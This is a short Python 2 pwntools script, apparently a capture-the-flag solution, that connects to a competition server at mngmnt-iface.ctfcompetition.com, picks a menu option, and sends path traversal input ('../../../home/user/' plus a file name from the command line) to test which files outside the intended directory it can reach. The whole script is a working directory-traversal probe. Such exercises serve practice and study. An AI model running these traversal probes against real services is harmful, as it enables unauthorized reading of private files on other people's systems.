from pwn import *

def GetToPathFinding(r):
    lines = r.recvline_contains('Quit')
    r.send("2\n")
    lines = r.recvlines(4)

def IsValidPath(r, path):
    r.send(path + "\n")
    message = r.recvline()
    if "Error:" in message:
        print "FAIL"
        return False
    print "SUCCESS"
    print message
    return True 

def main():
    r = remote('mngmnt-iface.ctfcompetition.com', 1337)
    GetToPathFinding(r)
    if IsValidPath(r, "../../../home/user/" + sys.argv[1]):
        print "SUCCESS\n"

main()